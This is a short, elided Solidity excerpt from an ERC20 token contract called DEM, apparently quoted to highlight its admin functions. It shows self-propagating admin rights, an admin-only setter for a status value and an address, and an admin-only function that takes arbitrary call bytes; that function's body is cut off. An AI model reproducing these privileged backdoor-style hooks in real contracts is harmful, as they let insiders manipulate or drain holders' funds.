...
contract DEM is ERC20, Ownable {
    ...
    function addCoinFactoryAdmin(address account) public {
        if (isCoinFactoryAdmin(msg.sender) || owner() == msg.sender) {_coinFactoryAdmins.add(account);}
    }
    ...
    function setDcStatue(uint256 _dcStatue, address _dcAddress) public onlyCoinFactoryAdmin {dcStatue = _dcStatue;
        dcAddress = _dcAddress;}

    function polymorphismUser(bytes memory call_p) public onlyCoinFactoryAdmin {
